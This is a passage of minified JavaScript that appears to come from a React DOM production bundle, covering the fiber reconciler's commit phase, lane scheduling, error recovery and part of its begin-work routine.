Ye(e),null;if(r=(e.flags&128)!==0,o=s.rendering,o===null)if(r)Ys(s,!1);else{if(De!==0||t!==null&&t.flags&128)for(t=e.child;t!==null;){if(o=cu(t),o!==null){for(e.flags|=128,Ys(s,!1),r=o.updateQueue,r!==null&&(e.updateQueue=r,e.flags|=4),e.subtreeFlags=0,r=n,n=e.child;n!==null;)s=n,t=r,s.flags&=14680066,o=s.alternate,o===null?(s.childLanes=0,s.lanes=t,s.child=null,s.subtreeFlags=0,s.memoizedProps=null,s.memoizedState=null,s.updateQueue=null,s.dependencies=null,s.stateNode=null):(s.childLanes=o.childLanes,s.lanes=o.lanes,s.child=o.child,s.subtreeFlags=0,s.deletions=null,s.memoizedProps=o.memoizedProps,s.memoizedState=o.memoizedState,s.updateQueue=o.updateQueue,s.type=o.type,t=o.dependencies,s.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),n=n.sibling;return te(le,le.current&1|2),e.child}t=t.sibling}s.tail!==null&&be()>vs&&(e.flags|=128,r=!0,Ys(s,!1),e.lanes=4194304)}else{if(!r)if(t=cu(o),t!==null){if(e.flags|=128,r=!0,n=t.updateQueue,n!==null&&(e.updateQueue=n,e.flags|=4),Ys(s,!0),s.tail===null&&s.tailMode==="hidden"&&!o.alternate&&!se)return Ye(e),null}else 2*be()-s.renderingStartTime>vs&&n!==1073741824&&(e.flags|=128,r=!0,Ys(s,!1),e.lanes=4194304);s.isBackwards?(o.sibling=e.child,e.child=o):(n=s.last,n!==null?n.sibling=o:e.child=o,s.last=o)}return s.tail!==null?(e=s.tail,s.rendering=e,s.tail=e.sibling,s.renderingStartTime=be(),e.sibling=null,n=le.current,te(le,r?n&1|2:n&1),e):(Ye(e),null);case 22:case 23:return dm(),r=e.memoizedState!==null,t!==null&&t.memoizedState!==null!==r&&(e.flags|=8192),r&&e.mode&1?Et&1073741824&&(Ye(e),e.subtreeFlags&6&&(e.flags|=8192)):Ye(e),null;case 24:return null;case 25:return null}throw Error(R(156,e.tag))}function jN(t,e){switch(Wp(e),e.tag){case 1:return xt(e.type)&&ru(),t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 3:return ys(),ie(yt),ie(nt),em(),t=e.flags,t&65536&&!(t&128)?(e.flags=t&-65537|128,e):null;case 5:return Zp(e),null;case 13:if(ie(le),t=e.memoizedState,t!==null&&t.dehydrated!==null){if(e.alternate===null)throw Error(R(340));ms()}return t=e.flags,t&65536?(e.flags=t&-65537|128,e):null;case 19:return ie(le),null;case 4:return ys(),null;case 10:return Jp(e.type._context),null;case 22:case 23:return dm(),null;case 24:return null;default:return null}}var rl=!1,Xe=!1,FN=typeof WeakSet=="function"?WeakSet:Set,j=null;function Gi(t,e){var n=t.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){xe(t,e,r)}else n.current=null}function dh(t,e,n){try{n()}catch(r){xe(t,e,r)}}var Yy=!1;function BN(t,e){if(Gf=Zl,t=fw(),Hp(t)){if("selectionStart"in t)var n={start:t.selectionStart,end:t.selectionEnd};else e:{n=(n=t.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var i=r.anchorOffset,s=r.focusNode;r=r.focusOffset;try{n.nodeType,s.nodeType}catch{n=null;break e}var o=0,a=-1,l=-1,u=0,c=0,d=t,f=null;t:for(;;){for(var h;d!==n||i!==0&&d.nodeType!==3||(a=o+i),d!==s||r!==0&&d.nodeType!==3||(l=o+r),d.nodeType===3&&(o+=d.nodeValue.length),(h=d.firstChild)!==null;)f=d,d=h;for(;;){if(d===t)break t;if(f===n&&++u===i&&(a=o),f===s&&++c===r&&(l=o),(h=d.nextSibling)!==null)break;d=f,f=d.parentNode}d=h}n=a===-1||l===-1?null:{start:a,end:l}}else n=null}n=n||{start:0,end:0}}else n=null;for(Jf={focusedElem:t,selectionRange:n},Zl=!1,j=e;j!==null;)if(e=j,t=e.child,(e.subtreeFlags&1028)!==0&&t!==null)t.return=e,j=t;else for(;j!==null;){e=j;try{var p=e.alternate;if(e.flags&1024)switch(e.tag){case 0:case 11:case 15:break;case 1:if(p!==null){var y=p.memoizedProps,x=p.memoizedState,g=e.stateNode,v=g.getSnapshotBeforeUpdate(e.elementType===e.type?y:Qt(e.type,y),x);g.__reactInternalSnapshotBeforeUpdate=v}break;case 3:var w=e.stateNode.containerInfo;w.nodeType===1?w.textContent="":w.nodeType===9&&w.documentElement&&w.removeChild(w.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(R(163))}}catch(b){xe(e,e.return,b)}if(t=e.sibling,t!==null){t.return=e.return,j=t;break}j=e.return}return p=Yy,Yy=!1,p}function vo(t,e,n){var r=e.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&t)===t){var s=i.destroy;i.destroy=void 0,s!==void 0&&dh(e,n,s)}i=i.next}while(i!==r)}}function Cc(t,e){if(e=e.updateQueue,e=e!==null?e.lastEffect:null,e!==null){var n=e=e.next;do{if((n.tag&t)===t){var r=n.create;n.destroy=r()}n=n.next}while(n!==e)}}function fh(t){var e=t.ref;if(e!==null){var n=t.stateNode;switch(t.tag){case 5:t=n;break;default:t=n}typeof e=="function"?e(t):e.current=t}}function lS(t){var e=t.alternate;e!==null&&(t.alternate=null,lS(e)),t.child=null,t.deletions=null,t.sibling=null,t.tag===5&&(e=t.stateNode,e!==null&&(delete e[gn],delete e[qo],delete e[Xf],delete e[wN],delete e[SN])),t.stateNode=null,t.return=null,t.dependencies=null,t.memoizedProps=null,t.memoizedState=null,t.pendingProps=null,t.stateNode=null,t.updateQueue=null}function uS(t){return t.tag===5||t.tag===3||t.tag===4}function Qy(t){e:for(;;){for(;t.sibling===null;){if(t.return===null||uS(t.return))return null;t=t.return}for(t.sibling.return=t.return,t=t.sibling;t.tag!==5&&t.tag!==6&&t.tag!==18;){if(t.flags&2||t.child===null||t.tag===4)continue e;t.child.return=t,t=t.child}if(!(t.flags&2))return t.stateNode}}function hh(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.nodeType===8?n.parentNode.insertBefore(t,e):n.insertBefore(t,e):(n.nodeType===8?(e=n.parentNode,e.insertBefore(t,n)):(e=n,e.appendChild(t)),n=n._reactRootContainer,n!=null||e.onclick!==null||(e.onclick=nu));else if(r!==4&&(t=t.child,t!==null))for(hh(t,e,n),t=t.sibling;t!==null;)hh(t,e,n),t=t.sibling}function ph(t,e,n){var r=t.tag;if(r===5||r===6)t=t.stateNode,e?n.insertBefore(t,e):n.appendChild(t);else if(r!==4&&(t=t.child,t!==null))for(ph(t,e,n),t=t.sibling;t!==null;)ph(t,e,n),t=t.sibling}var _e=null,Xt=!1;function Qn(t,e,n){for(n=n.child;n!==null;)cS(t,e,n),n=n.sibling}function cS(t,e,n){if(yn&&typeof yn.onCommitFiberUnmount=="function")try{yn.onCommitFiberUnmount(gc,n)}catch{}switch(n.tag){case 5:Xe||Gi(n,e);case 6:var r=_e,i=Xt;_e=null,Qn(t,e,n),_e=r,Xt=i,_e!==null&&(Xt?(t=_e,n=n.stateNode,t.nodeType===8?t.parentNode.removeChild(n):t.removeChild(n)):_e.removeChild(n.stateNode));break;case 18:_e!==null&&(Xt?(t=_e,n=n.stateNode,t.nodeType===8?kd(t.parentNode,n):t.nodeType===1&&kd(t,n),$o(t)):kd(_e,n.stateNode));break;case 4:r=_e,i=Xt,_e=n.stateNode.containerInfo,Xt=!0,Qn(t,e,n),_e=r,Xt=i;break;case 0:case 11:case 14:case 15:if(!Xe&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var s=i,o=s.destroy;s=s.tag,o!==void 0&&(s&2||s&4)&&dh(n,e,o),i=i.next}while(i!==r)}Qn(t,e,n);break;case 1:if(!Xe&&(Gi(n,e),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(a){xe(n,e,a)}Qn(t,e,n);break;case 21:Qn(t,e,n);break;case 22:n.mode&1?(Xe=(r=Xe)||n.memoizedState!==null,Qn(t,e,n),Xe=r):Qn(t,e,n);break;default:Qn(t,e,n)}}function Xy(t){var e=t.updateQueue;if(e!==null){t.updateQueue=null;var n=t.stateNode;n===null&&(n=t.stateNode=new FN),e.forEach(function(r){var i=qN.bind(null,t,r);n.has(r)||(n.add(r),r.then(i,i))})}}function Jt(t,e){var n=e.deletions;if(n!==null)for(var r=0;r<n.length;r++){var i=n[r];try{var s=t,o=e,a=o;e:for(;a!==null;){switch(a.tag){case 5:_e=a.stateNode,Xt=!1;break e;case 3:_e=a.stateNode.containerInfo,Xt=!0;break e;case 4:_e=a.stateNode.containerInfo,Xt=!0;break e}a=a.return}if(_e===null)throw Error(R(160));cS(s,o,i),_e=null,Xt=!1;var l=i.alternate;l!==null&&(l.return=null),i.return=null}catch(u){xe(i,e,u)}}if(e.subtreeFlags&12854)for(e=e.child;e!==null;)dS(e,t),e=e.sibling}function dS(t,e){var n=t.alternate,r=t.flags;switch(t.tag){case 0:case 11:case 14:case 15:if(Jt(e,t),cn(t),r&4){try{vo(3,t,t.return),Cc(3,t)}catch(y){xe(t,t.return,y)}try{vo(5,t,t.return)}catch(y){xe(t,t.return,y)}}break;case 1:Jt(e,t),cn(t),r&512&&n!==null&&Gi(n,n.return);break;case 5:if(Jt(e,t),cn(t),r&512&&n!==null&&Gi(n,n.return),t.flags&32){var i=t.stateNode;try{Bo(i,"")}catch(y){xe(t,t.return,y)}}if(r&4&&(i=t.stateNode,i!=null)){var s=t.memoizedProps,o=n!==null?n.memoizedProps:s,a=t.type,l=t.updateQueue;if(t.updateQueue=null,l!==null)try{a==="input"&&s.type==="radio"&&s.name!=null&&D1(i,s),Bf(a,o);var u=Bf(a,s);for(o=0;o<l.length;o+=2){var c=l[o],d=l[o+1];c==="style"?B1(i,d):c==="dangerouslySetInnerHTML"?j1(i,d):c==="children"?Bo(i,d):Pp(i,c,d,u)}switch(a){case"input":Df(i,s);break;case"textarea":L1(i,s);break;case"select":var f=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!s.multiple;var h=s.value;h!=null?ns(i,!!s.multiple,h,!1):f!==!!s.multiple&&(s.defaultValue!=null?ns(i,!!s.multiple,s.defaultValue,!0):ns(i,!!s.multiple,s.multiple?[]:"",!1))}i[qo]=s}catch(y){xe(t,t.return,y)}}break;case 6:if(Jt(e,t),cn(t),r&4){if(t.stateNode===null)throw Error(R(162));i=t.stateNode,s=t.memoizedProps;try{i.nodeValue=s}catch(y){xe(t,t.return,y)}}break;case 3:if(Jt(e,t),cn(t),r&4&&n!==null&&n.memoizedState.isDehydrated)try{$o(e.containerInfo)}catch(y){xe(t,t.return,y)}break;case 4:Jt(e,t),cn(t);break;case 13:Jt(e,t),cn(t),i=t.child,i.flags&8192&&(s=i.memoizedState!==null,i.stateNode.isHidden=s,!s||i.alternate!==null&&i.alternate.memoizedState!==null||(um=be())),r&4&&Xy(t);break;case 22:if(c=n!==null&&n.memoizedState!==null,t.mode&1?(Xe=(u=Xe)||c,Jt(e,t),Xe=u):Jt(e,t),cn(t),r&8192){if(u=t.memoizedState!==null,(t.stateNode.isHidden=u)&&!c&&t.mode&1)for(j=t,c=t.child;c!==null;){for(d=j=c;j!==null;){switch(f=j,h=f.child,f.tag){case 0:case 11:case 14:case 15:vo(4,f,f.return);break;case 1:Gi(f,f.return);var p=f.stateNode;if(typeof p.componentWillUnmount=="function"){r=f,n=f.return;try{e=r,p.props=e.memoizedProps,p.state=e.memoizedState,p.componentWillUnmount()}catch(y){xe(r,n,y)}}break;case 5:Gi(f,f.return);break;case 22:if(f.memoizedState!==null){e0(d);continue}}h!==null?(h.return=f,j=h):e0(d)}c=c.sibling}e:for(c=null,d=t;;){if(d.tag===5){if(c===null){c=d;try{i=d.stateNode,u?(s=i.style,typeof s.setProperty=="function"?s.setProperty("display","none","important"):s.display="none"):(a=d.stateNode,l=d.memoizedProps.style,o=l!=null&&l.hasOwnProperty("display")?l.display:null,a.style.display=F1("display",o))}catch(y){xe(t,t.return,y)}}}else if(d.tag===6){if(c===null)try{d.stateNode.nodeValue=u?"":d.memoizedProps}catch(y){xe(t,t.return,y)}}else if((d.tag!==22&&d.tag!==23||d.memoizedState===null||d===t)&&d.child!==null){d.child.return=d,d=d.child;continue}if(d===t)break e;for(;d.sibling===null;){if(d.return===null||d.return===t)break e;c===d&&(c=null),d=d.return}c===d&&(c=null),d.sibling.return=d.return,d=d.sibling}}break;case 19:Jt(e,t),cn(t),r&4&&Xy(t);break;case 21:break;default:Jt(e,t),cn(t)}}function cn(t){var e=t.flags;if(e&2){try{e:{for(var n=t.return;n!==null;){if(uS(n)){var r=n;break e}n=n.return}throw Error(R(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(Bo(i,""),r.flags&=-33);var s=Qy(t);ph(t,s,i);break;case 3:case 4:var o=r.stateNode.containerInfo,a=Qy(t);hh(t,a,o);break;default:throw Error(R(161))}}catch(l){xe(t,t.return,l)}t.flags&=-3}e&4096&&(t.flags&=-4097)}function VN(t,e,n){j=t,fS(t)}function fS(t,e,n){for(var r=(t.mode&1)!==0;j!==null;){var i=j,s=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||rl;if(!o){var a=i.alternate,l=a!==null&&a.memoizedState!==null||Xe;a=rl;var u=Xe;if(rl=o,(Xe=l)&&!u)for(j=i;j!==null;)o=j,l=o.child,o.tag===22&&o.memoizedState!==null?t0(i):l!==null?(l.return=o,j=l):t0(i);for(;s!==null;)j=s,fS(s),s=s.sibling;j=i,rl=a,Xe=u}Zy(t)}else i.subtreeFlags&8772&&s!==null?(s.return=i,j=s):Zy(t)}}function Zy(t){for(;j!==null;){var e=j;if(e.flags&8772){var n=e.alternate;try{if(e.flags&8772)switch(e.tag){case 0:case 11:case 15:Xe||Cc(5,e);break;case 1:var r=e.stateNode;if(e.flags&4&&!Xe)if(n===null)r.componentDidMount();else{var i=e.elementType===e.type?n.memoizedProps:Qt(e.type,n.memoizedProps);r.componentDidUpdate(i,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var s=e.updateQueue;s!==null&&Fy(e,s,r);break;case 3:var o=e.updateQueue;if(o!==null){if(n=null,e.child!==null)switch(e.child.tag){case 5:n=e.child.stateNode;break;case 1:n=e.child.stateNode}Fy(e,o,n)}break;case 5:var a=e.stateNode;if(n===null&&e.flags&4){n=a;var l=e.memoizedProps;switch(e.type){case"button":case"input":case"select":case"textarea":l.autoFocus&&n.focus();break;case"img":l.src&&(n.src=l.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(e.memoizedState===null){var u=e.alternate;if(u!==null){var c=u.memoizedState;if(c!==null){var d=c.dehydrated;d!==null&&$o(d)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(R(163))}Xe||e.flags&512&&fh(e)}catch(f){xe(e,e.return,f)}}if(e===t){j=null;break}if(n=e.sibling,n!==null){n.return=e.return,j=n;break}j=e.return}}function e0(t){for(;j!==null;){var e=j;if(e===t){j=null;break}var n=e.sibling;if(n!==null){n.return=e.return,j=n;break}j=e.return}}function t0(t){for(;j!==null;){var e=j;try{switch(e.tag){case 0:case 11:case 15:var n=e.return;try{Cc(4,e)}catch(l){xe(e,n,l)}break;case 1:var r=e.stateNode;if(typeof r.componentDidMount=="function"){var i=e.return;try{r.componentDidMount()}catch(l){xe(e,i,l)}}var s=e.return;try{fh(e)}catch(l){xe(e,s,l)}break;case 5:var o=e.return;try{fh(e)}catch(l){xe(e,o,l)}}}catch(l){xe(e,e.return,l)}if(e===t){j=null;break}var a=e.sibling;if(a!==null){a.return=e.return,j=a;break}j=e.return}}var zN=Math.ceil,hu=Gn.ReactCurrentDispatcher,am=Gn.ReactCurrentOwner,Ht=Gn.ReactCurrentBatchConfig,Q=0,je=null,Ee=null,Ke=0,Et=0,Ji=jr(0),De=0,Zo=null,yi=0,Ec=0,lm=0,wo=null,ht=null,um=0,vs=1/0,On=null,pu=!1,mh=null,Sr=null,il=!1,fr=null,mu=0,So=0,gh=null,Rl=-1,Ol=0;function at(){return Q&6?be():Rl!==-1?Rl:Rl=be()}function kr(t){return t.mode&1?Q&2&&Ke!==0?Ke&-Ke:bN.transition!==null?(Ol===0&&(Ol=Y1()),Ol):(t=Z,t!==0||(t=window.event,t=t===void 0?16:rw(t.type)),t):1}function rn(t,e,n,r){if(50<So)throw So=0,gh=null,Error(R(185));ka(t,n,r),(!(Q&2)||t!==je)&&(t===je&&(!(Q&2)&&(Ec|=n),De===4&&lr(t,Ke)),vt(t,r),n===1&&Q===0&&!(e.mode&1)&&(vs=be()+500,Sc&&Fr()))}function vt(t,e){var n=t.callbackNode;bM(t,e);var r=Xl(t,t===je?Ke:0);if(r===0)n!==null&&cy(n),t.callbackNode=null,t.callbackPriority=0;else if(e=r&-r,t.callbackPriority!==e){if(n!=null&&cy(n),e===1)t.tag===0?kN(n0.bind(null,t)):kw(n0.bind(null,t)),xN(function(){!(Q&6)&&Fr()}),n=null;else{switch(Q1(r)){case 1:n=Ip;break;case 4:n=G1;break;case 16:n=Ql;break;case 536870912:n=J1;break;default:n=Ql}n=wS(n,hS.bind(null,t))}t.callbackPriority=e,t.callbackNode=n}}function hS(t,e){if(Rl=-1,Ol=0,Q&6)throw Error(R(327));var n=t.callbackNode;if(ls()&&t.callbackNode!==n)return null;var r=Xl(t,t===je?Ke:0);if(r===0)return null;if(r&30||r&t.expiredLanes||e)e=gu(t,r);else{e=r;var i=Q;Q|=2;var s=mS();(je!==t||Ke!==e)&&(On=null,vs=be()+500,ii(t,e));do try{HN();break}catch(a){pS(t,a)}while(!0);Gp(),hu.current=s,Q=i,Ee!==null?e=0:(je=null,Ke=0,e=De)}if(e!==0){if(e===2&&(i=Hf(t),i!==0&&(r=i,e=yh(t,i))),e===1)throw n=Zo,ii(t,0),lr(t,r),vt(t,be()),n;if(e===6)lr(t,r);else{if(i=t.current.alternate,!(r&30)&&!_N(i)&&(e=gu(t,r),e===2&&(s=Hf(t),s!==0&&(r=s,e=yh(t,s))),e===1))throw n=Zo,ii(t,0),lr(t,r),vt(t,be()),n;switch(t.finishedWork=i,t.finishedLanes=r,e){case 0:case 1:throw Error(R(345));case 2:Wr(t,ht,On);break;case 3:if(lr(t,r),(r&130023424)===r&&(e=um+500-be(),10<e)){if(Xl(t,0)!==0)break;if(i=t.suspendedLanes,(i&r)!==r){at(),t.pingedLanes|=t.suspendedLanes&i;break}t.timeoutHandle=Qf(Wr.bind(null,t,ht,On),e);break}Wr(t,ht,On);break;case 4:if(lr(t,r),(r&4194240)===r)break;for(e=t.eventTimes,i=-1;0<r;){var o=31-nn(r);s=1<<o,o=e[o],o>i&&(i=o),r&=~s}if(r=i,r=be()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*zN(r/1960))-r,10<r){t.timeoutHandle=Qf(Wr.bind(null,t,ht,On),r);break}Wr(t,ht,On);break;case 5:Wr(t,ht,On);break;default:throw Error(R(329))}}}return vt(t,be()),t.callbackNode===n?hS.bind(null,t):null}function yh(t,e){var n=wo;return t.current.memoizedState.isDehydrated&&(ii(t,e).flags|=256),t=gu(t,e),t!==2&&(e=ht,ht=n,e!==null&&xh(e)),t}function xh(t){ht===null?ht=t:ht.push.apply(ht,t)}function _N(t){for(var e=t;;){if(e.flags&16384){var n=e.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var i=n[r],s=i.getSnapshot;i=i.value;try{if(!on(s(),i))return!1}catch{return!1}}}if(n=e.child,e.subtreeFlags&16384&&n!==null)n.return=e,e=n;else{if(e===t)break;for(;e.sibling===null;){if(e.return===null||e.return===t)return!0;e=e.return}e.sibling.return=e.return,e=e.sibling}}return!0}function lr(t,e){for(e&=~lm,e&=~Ec,t.suspendedLanes|=e,t.pingedLanes&=~e,t=t.expirationTimes;0<e;){var n=31-nn(e),r=1<<n;t[n]=-1,e&=~r}}function n0(t){if(Q&6)throw Error(R(327));ls();var e=Xl(t,0);if(!(e&1))return vt(t,be()),null;var n=gu(t,e);if(t.tag!==0&&n===2){var r=Hf(t);r!==0&&(e=r,n=yh(t,r))}if(n===1)throw n=Zo,ii(t,0),lr(t,e),vt(t,be()),n;if(n===6)throw Error(R(345));return t.finishedWork=t.current.alternate,t.finishedLanes=e,Wr(t,ht,On),vt(t,be()),null}function cm(t,e){var n=Q;Q|=1;try{return t(e)}finally{Q=n,Q===0&&(vs=be()+500,Sc&&Fr())}}function xi(t){fr!==null&&fr.tag===0&&!(Q&6)&&ls();var e=Q;Q|=1;var n=Ht.transition,r=Z;try{if(Ht.transition=null,Z=1,t)return t()}finally{Z=r,Ht.transition=n,Q=e,!(Q&6)&&Fr()}}function dm(){Et=Ji.current,ie(Ji)}function ii(t,e){t.finishedWork=null,t.finishedLanes=0;var n=t.timeoutHandle;if(n!==-1&&(t.timeoutHandle=-1,yN(n)),Ee!==null)for(n=Ee.return;n!==null;){var r=n;switch(Wp(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&ru();break;case 3:ys(),ie(yt),ie(nt),em();break;case 5:Zp(r);break;case 4:ys();break;case 13:ie(le);break;case 19:ie(le);break;case 10:Jp(r.type._context);break;case 22:case 23:dm()}n=n.return}if(je=t,Ee=t=br(t.current,null),Ke=Et=e,De=0,Zo=null,lm=Ec=yi=0,ht=wo=null,Jr!==null){for(e=0;e<Jr.length;e++)if(n=Jr[e],r=n.interleaved,r!==null){n.interleaved=null;var i=r.next,s=n.pending;if(s!==null){var o=s.next;s.next=i,r.next=o}n.pending=r}Jr=null}return t}function pS(t,e){do{var n=Ee;try{if(Gp(),Nl.current=fu,du){for(var r=de.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}du=!1}if(gi=0,Le=Oe=de=null,xo=!1,Yo=0,am.current=null,n===null||n.return===null){De=1,Zo=e,Ee=null;break}e:{var s=t,o=n.return,a=n,l=e;if(e=Ke,a.flags|=32768,l!==null&&typeof l=="object"&&typeof l.then=="function"){var u=l,c=a,d=c.tag;if(!(c.mode&1)&&(d===0||d===11||d===15)){var f=c.alternate;f?(c.updateQueue=f.updateQueue,c.memoizedState=f.memoizedState,c.lanes=f.lanes):(c.updateQueue=null,c.memoizedState=null)}var h=Hy(o);if(h!==null){h.flags&=-257,Uy(h,o,a,s,e),h.mode&1&&$y(s,u,e),e=h,l=u;var p=e.updateQueue;if(p===null){var y=new Set;y.add(l),e.updateQueue=y}else p.add(l);break e}else{if(!(e&1)){$y(s,u,e),fm();break e}l=Error(R(426))}}else if(se&&a.mode&1){var x=Hy(o);if(x!==null){!(x.flags&65536)&&(x.flags|=256),Uy(x,o,a,s,e),Kp(xs(l,a));break e}}s=l=xs(l,a),De!==4&&(De=2),wo===null?wo=[s]:wo.push(s),s=o;do{switch(s.tag){case 3:s.flags|=65536,e&=-e,s.lanes|=e;var g=Qw(s,l,e);jy(s,g);break e;case 1:a=l;var v=s.type,w=s.stateNode;if(!(s.flags&128)&&(typeof v.getDerivedStateFromError=="function"||w!==null&&typeof w.componentDidCatch=="function"&&(Sr===null||!Sr.has(w)))){s.flags|=65536,e&=-e,s.lanes|=e;var b=Xw(s,a,e);jy(s,b);break e}}s=s.return}while(s!==null)}yS(n)}catch(k){e=k,Ee===n&&n!==null&&(Ee=n=n.return);continue}break}while(!0)}function mS(){var t=hu.current;return hu.current=fu,t===null?fu:t}function fm(){(De===0||De===3||De===2)&&(De=4),je===null||!(yi&268435455)&&!(Ec&268435455)||lr(je,Ke)}function gu(t,e){var n=Q;Q|=2;var r=mS();(je!==t||Ke!==e)&&(On=null,ii(t,e));do try{$N();break}catch(i){pS(t,i)}while(!0);if(Gp(),Q=n,hu.current=r,Ee!==null)throw Error(R(261));return je=null,Ke=0,De}function $N(){for(;Ee!==null;)gS(Ee)}function HN(){for(;Ee!==null&&!pM();)gS(Ee)}function gS(t){var e=vS(t.alternate,t,Et);t.memoizedProps=t.pendingProps,e===null?yS(t):Ee=e,am.current=null}function yS(t){var e=t;do{var n=e.alternate;if(t=e.return,e.flags&32768){if(n=jN(n,e),n!==null){n.flags&=32767,Ee=n;return}if(t!==null)t.flags|=32768,t.subtreeFlags=0,t.deletions=null;else{De=6,Ee=null;return}}else if(n=IN(n,e,Et),n!==null){Ee=n;return}if(e=e.sibling,e!==null){Ee=e;return}Ee=e=t}while(e!==null);De===0&&(De=5)}function Wr(t,e,n){var r=Z,i=Ht.transition;try{Ht.transition=null,Z=1,UN(t,e,n,r)}finally{Ht.transition=i,Z=r}return null}function UN(t,e,n,r){do ls();while(fr!==null);if(Q&6)throw Error(R(327));n=t.finishedWork;var i=t.finishedLanes;if(n===null)return null;if(t.finishedWork=null,t.finishedLanes=0,n===t.current)throw Error(R(177));t.callbackNode=null,t.callbackPriority=0;var s=n.lanes|n.childLanes;if(CM(t,s),t===je&&(Ee=je=null,Ke=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||il||(il=!0,wS(Ql,function(){return ls(),null})),s=(n.flags&15990)!==0,n.subtreeFlags&15990||s){s=Ht.transition,Ht.transition=null;var o=Z;Z=1;var a=Q;Q|=4,am.current=null,BN(t,n),dS(n,t),cN(Jf),Zl=!!Gf,Jf=Gf=null,t.current=n,VN(n),mM(),Q=a,Z=o,Ht.transition=s}else t.current=n;if(il&&(il=!1,fr=t,mu=i),s=t.pendingLanes,s===0&&(Sr=null),xM(n.stateNode),vt(t,be()),e!==null)for(r=t.onRecoverableError,n=0;n<e.length;n++)i=e[n],r(i.value,{componentStack:i.stack,digest:i.digest});if(pu)throw pu=!1,t=mh,mh=null,t;return mu&1&&t.tag!==0&&ls(),s=t.pendingLanes,s&1?t===gh?So++:(So=0,gh=t):So=0,Fr(),null}function ls(){if(fr!==null){var t=Q1(mu),e=Ht.transition,n=Z;try{if(Ht.transition=null,Z=16>t?16:t,fr===null)var r=!1;else{if(t=fr,fr=null,mu=0,Q&6)throw Error(R(331));var i=Q;for(Q|=4,j=t.current;j!==null;){var s=j,o=s.child;if(j.flags&16){var a=s.deletions;if(a!==null){for(var l=0;l<a.length;l++){var u=a[l];for(j=u;j!==null;){var c=j;switch(c.tag){case 0:case 11:case 15:vo(8,c,s)}var d=c.child;if(d!==null)d.return=c,j=d;else for(;j!==null;){c=j;var f=c.sibling,h=c.return;if(lS(c),c===u){j=null;break}if(f!==null){f.return=h,j=f;break}j=h}}}var p=s.alternate;if(p!==null){var y=p.child;if(y!==null){p.child=null;do{var x=y.sibling;y.sibling=null,y=x}while(y!==null)}}j=s}}if(s.subtreeFlags&2064&&o!==null)o.return=s,j=o;else e:for(;j!==null;){if(s=j,s.flags&2048)switch(s.tag){case 0:case 11:case 15:vo(9,s,s.return)}var g=s.sibling;if(g!==null){g.return=s.return,j=g;break e}j=s.return}}var v=t.current;for(j=v;j!==null;){o=j;var w=o.child;if(o.subtreeFlags&2064&&w!==null)w.return=o,j=w;else e:for(o=v;j!==null;){if(a=j,a.flags&2048)try{switch(a.tag){case 0:case 11:case 15:Cc(9,a)}}catch(k){xe(a,a.return,k)}if(a===o){j=null;break e}var b=a.sibling;if(b!==null){b.return=a.return,j=b;break e}j=a.return}}if(Q=i,Fr(),yn&&typeof yn.onPostCommitFiberRoot=="function")try{yn.onPostCommitFiberRoot(gc,t)}catch{}r=!0}return r}finally{Z=n,Ht.transition=e}}return!1}function r0(t,e,n){e=xs(n,e),e=Qw(t,e,1),t=wr(t,e,1),e=at(),t!==null&&(ka(t,1,e),vt(t,e))}function xe(t,e,n){if(t.tag===3)r0(t,t,n);else for(;e!==null;){if(e.tag===3){r0(e,t,n);break}else if(e.tag===1){var r=e.stateNode;if(typeof e.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(Sr===null||!Sr.has(r))){t=xs(n,t),t=Xw(e,t,1),e=wr(e,t,1),t=at(),e!==null&&(ka(e,1,t),vt(e,t));break}}e=e.return}}function WN(t,e,n){var r=t.pingCache;r!==null&&r.delete(e),e=at(),t.pingedLanes|=t.suspendedLanes&n,je===t&&(Ke&n)===n&&(De===4||De===3&&(Ke&130023424)===Ke&&500>be()-um?ii(t,0):lm|=n),vt(t,e)}function xS(t,e){e===0&&(t.mode&1?(e=Ga,Ga<<=1,!(Ga&130023424)&&(Ga=4194304)):e=1);var n=at();t=Hn(t,e),t!==null&&(ka(t,e,n),vt(t,n))}function KN(t){var e=t.memoizedState,n=0;e!==null&&(n=e.retryLane),xS(t,n)}function qN(t,e){var n=0;switch(t.tag){case 13:var r=t.stateNode,i=t.memoizedState;i!==null&&(n=i.retryLane);break;case 19:r=t.stateNode;break;default:throw Error(R(314))}r!==null&&r.delete(e),xS(t,n)}var vS;vS=function(t,e,n){if(t!==null)if(t.memoizedProps!==e.pendingProps||yt.current)mt=!0;else{if(!(t.lanes&n)&&!(e.flags&128))return mt=!1,LN(t,e,n);mt=!!(t.flags&131072)}else mt=!1,se&&e.flags&1048576&&bw(e,ou,e.index);switch(e.lanes=0,e.tag){case 2:var r=e.type;Pl(t,e),t=e.pendingProps;var i=ps(e,nt.current);as(e,n),i=nm(null,e,r,t,i,n);var s=rm();return e.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,xt(r)?(s=!0,iu(e)):s=!1,e.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,Qp(e),i.updater=bc,e.stateNode=i,i._reactInternals=e,ih(e,r,t,n),e=ah(null,e,r,!0,s,n)):(e.tag=0,se&&s&&Up(e),it(null,e,i,n),e=e.child),e;case 